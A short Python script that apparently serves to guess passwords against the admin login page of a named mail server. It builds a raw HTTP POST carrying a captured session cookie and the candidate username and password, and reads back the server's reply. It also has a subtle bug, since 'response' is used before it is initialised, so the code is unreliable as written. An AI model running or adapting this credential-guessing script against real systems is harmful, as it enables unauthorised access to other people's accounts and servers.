# coding:utf-8

import socket
import hashlib

def try_passwd(user,passwd):
    sock = socket.socket()
    sock.connect(('mail.celay.org.cn', 8080))
    sock.send(
        "POST /gw/admin/index.php?mod=admin HTTP/1.1\r\nHost: mail.celay.org.cn:8080\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\r\nAccept-Encoding: gzip, deflate\r\nReferer: http://mail.celay.org.cn:8080/gw/admin/\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 102\r\nConnection: close\r\nCookie: EMPHPSID=ufsvg3ecbb2jcps93s9pehrj40; empos=0; emLoginTo=via_acct; emLoginUser=333\r\nUpgrade-Insecure-Requests: 1\r\n\r\nuser="+ user +"&pwd=&LANG=&val=%5B%"+ user +"%22%2C%22"+ passwd +"%22%5D&act=login")
    while True:
        buf = sock.recv(4096)
        response += buf
        if not len(buf):
            break
    return response




def get_md5(data):
    md5_1 = hashlib.md5()
    md5_1.update(data.encode('utf8'))
    return md5_1.hexdigest()